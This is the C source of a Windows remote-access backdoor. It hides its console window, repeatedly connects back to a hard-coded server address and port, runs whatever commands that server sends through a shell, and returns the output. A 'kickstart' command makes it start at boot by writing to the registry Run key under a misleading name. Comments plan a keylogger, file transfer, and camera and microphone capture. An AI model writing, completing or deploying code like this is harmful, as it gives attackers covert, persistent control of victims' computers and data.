#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <winsock.h>
#include <winerror.h>

int sock;

//add keylogger
// file transfer feature
// real time camera, video, microphone
// make a menu for different options on the server

int BootRun()
{
    char err[]="Failed\n";
    char success[] = "Created persistance[starting after boot] at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR sz_path[MAX_PATH];
    DWORD path_length = 0;

    path_length = GetModuleFileName(NULL, sz_path, MAX_PATH);
    if(path_length == 0)
    {
        send(sock, err, sizeof(err), 0);//send error message to the server
        return -1;
    }

    HKEY new_val;

    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &new_val) != ERROR_SUCCESS)
    {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    DWORD path_len_bytes = path_length*sizeof(*sz_path);
    if(RegSetValueEx(new_val, TEXT("Important"), 0, REG_SZ, (LPBYTE)sz_path, path_len_bytes) != ERROR_SUCCESS)
    {
        RegCloseKey(new_val);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    send(sock, success, sizeof(success), 0);
    RegCloseKey(new_val);
    return 1;
}

void Shell()
{
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while(1)
    {
        //jump:
        memset(&buffer, 0, sizeof(buffer));
        memset(&container, 0, sizeof(container));
        memset(&total_response, 0, sizeof(total_response));

        recv(sock, buffer, 1024, 0);
        if(strncmp("q", buffer, 1)==0)
        {
            closesocket(sock);
            WSACleanup();
            exit(1);
        }
        else if(strncmp("cd ", buffer, 3)==0)
        {
            char *dir = (char*)malloc(100*sizeof(char));

            //checking
            int i=3;
            //MessageBox(NULL, "came here", "caption", 0);
            while(buffer[i]!='\0')
            {
                dir[i-3] = buffer[i];
                i++;
            }
            dir[i-3] = buffer[i];
            chdir(dir);
            //MessageBox(NULL, dir, "caption", 0);
            //char *a = (char*)malloc(2*sizeof(char));
            // a[0] = b+66;
            // a[1] = '\0';
            // MessageBox(NULL, a, "check", 0);
            //send(sock, a, sizeof(dir), 0);
            //MessageBox(NULL, "after send", "caption", 0);
            free(dir);
        }
        else if(strncmp("kickstart", buffer, 9)==0)
        {
            int a = BootRun();
            if(a==1)
            {
                MessageBox(NULL, "Wrote to registry successfully", "warning", 0);
            }
        }
        else
        {
            FILE *fp;
            fp = _popen(buffer, "r");
            while(fgets(container, 1024, fp)!=NULL)
            {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response),0);
            fclose(fp);
        }
    }
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lmCmdLine, int CmdShow)
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    struct sockaddr_in serv_addr;
    unsigned short serv_port;
    char *serv_ip;
    WSADATA wsa_data;

    serv_ip = "192.168.0.106";
    serv_port = 12345;

    if(WSAStartup(MAKEWORD(2,0), &wsa_data)!=0)
        exit(1);
    
    sock = socket(AF_INET, SOCK_STREAM, 0);

    if(sock == -1)
        MessageBox(NULL, "Here", "here", 0);

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(serv_ip);
    serv_addr.sin_port = htons(serv_port);

    //start:
    //MessageBox(NULL, "Created socket", "here", 0);
    while(connect(sock, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) != 0)
    {
        Sleep(10);
    }
    //MessageBox(NULL, "Hello world", "caption", 0);
    Shell();
    
    //return 0;
}